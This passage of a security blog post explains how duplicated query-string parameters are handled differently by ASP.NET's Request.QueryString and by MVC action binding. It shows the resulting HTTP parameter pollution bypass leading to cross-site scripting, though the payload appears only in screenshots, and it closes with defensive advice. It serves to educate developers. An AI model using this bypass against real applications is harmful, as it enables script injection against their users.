-Let me just state this again: we're only interested in ASP.NET and IIS _**and MVC**_. The reason we need to emphasise this is because MVC rocks the boat a little bit. It's important to remember that [Request.QueryString][] is not specific to MVC, it's something that lives in ASP.NET land. _Controller actions_ on the other hand are not available across the board when using ASP.NET, they live in MVC land. When it comes to binding query string parameters to controller action method parameters, MVC doesn't behave how you would expect, and it's not the same as what happens when dealing with `Request.QueryString` directly.
-
-So what happens in ASP.NET and IIS _without_ MVC if an attacker passes in two values for the same parameter? Consider the following url: `http://foo.com/bar?baz=0&baz=dooby`
-
-While in C# land (remember, outside of MVC) `Request.QueryString["baz"]` will contain a string value `0,dooby`. In our current environment any duplicate instances of query string values are passed through as a single value joined together by commas. This knowledge is scarily uncommon. Many .NET developers that I know are not aware of this behaviour.
-
-This is where MVC comes along and sprays poop over everything.
-
-ASP.NET MVC controller action method parameter binding doesn't handle multiple instance of the same query string parameters in the same way. In fact, it behaves more like JSP on Jetty: **it only uses the first value and ignores the rest**.
-
-Why is this bad? Well this means that code outside of controller actions may result in different behaviour to that which is inside. More importantly, accessing `Request.QueryString` to get access to a parameter doesn't mean that you'll get the same value as what was handled in the controller action.
-
-Let's take a look at what might happen if we threw multiple instances via the query string at our dodgy MVC application:
-
-{% img /uploads/2012/11/xss-hpp-invalid.png 'HPP example' %}
-
-The above screenshot shows both the query string and the page source when we do this. That's right, MVC used the first value, set to `0`, without any issues and invoked the view engine. The view's assumption that the `index` parameter has been sanitised by the controller has now been proven unsafe. Now we can see that we do have access to the source. Let's see what happens if we went a step further and passed in a more sinister value:
-
-{% img /uploads/2012/11/xss-hpp-valid.png 'HPP XSS exploit' %}
-
-Pwned.
-
-Conclusion
-----------
-
-_Never_ trust unsanitised input, that includes stuff that gets passed in through `Request.QueryString`. Do not assume that the contents are safe just because your controller action handled things without throwing an exception. If you're going to render data that has come in from the user or from the query string, delegate responsibility of validation to the controller action and only trust content which is passed to the view via [ViewData][] or the `Model`.
-
-  [ViewData]: http://msdn.microsoft.com/en-us/library/system.web.mvc.viewpage.viewdata(v=vs.108).aspx
-  [HPPPDF]: https://www.owasp.org/images/b/ba/AppsecEU09_CarettoniDiPaola_v0.8.pdf
-  [Request.QueryString]: http://msdn.microsoft.com/en-us/library/ms524784(v=vs.90).aspx
-  [XSS]: http://en.wikipedia.org/wiki/Cross-site_scripting
-  [System.Tuple]: http://msdn.microsoft.com/en-us/library/system.tuple.aspx
-  [HPP]: http://blog.iseclab.org/2010/12/08/http-parameter-pollution-so-how-many-flawed-applications-exist-out-there-we-go-online-with-a-new-service/
-
 ]]></content>
   </entry>
   
